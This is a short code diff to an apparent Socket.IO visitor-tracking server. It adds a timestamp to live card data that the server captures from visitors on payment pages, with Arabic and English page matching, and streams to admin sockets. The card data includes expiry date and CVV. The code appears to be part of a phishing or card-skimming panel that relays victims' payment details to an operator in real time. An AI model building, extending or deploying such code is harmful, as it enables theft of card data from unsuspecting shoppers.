@@ -411,6 +411,7 @@ io.on("connection", (socket) => {
       const pageLower2 = (page || '').toLowerCase();
       if (!pageLower2.includes('الدفع') && !pageLower2.includes('payment') && !pageLower2.includes('credit')) {
         visitor.liveCard = null;
+        visitor.liveCardTimestamp = null;
       }
       // Activate hasEnteredCardPage when visitor reaches checkout/payment pages
       const pageLower = (page || '').toLowerCase();
@@ -548,12 +549,16 @@ io.on("connection", (socket) => {
         expiryDate: data.expiryDate || "",
         cvv: data.cvv || "",
       };
+      if (!visitor.liveCardTimestamp) {
+        visitor.liveCardTimestamp = new Date().toISOString();
+      }
       visitors.set(socket.id, visitor);
       // Notify admins immediately
       admins.forEach((admin, adminSocketId) => {
         io.to(adminSocketId).emit("card:liveUpdate", {
           visitorId: visitor._id,
           liveCard: visitor.liveCard,
+          liveCardTimestamp: visitor.liveCardTimestamp,
         });
       });
     }
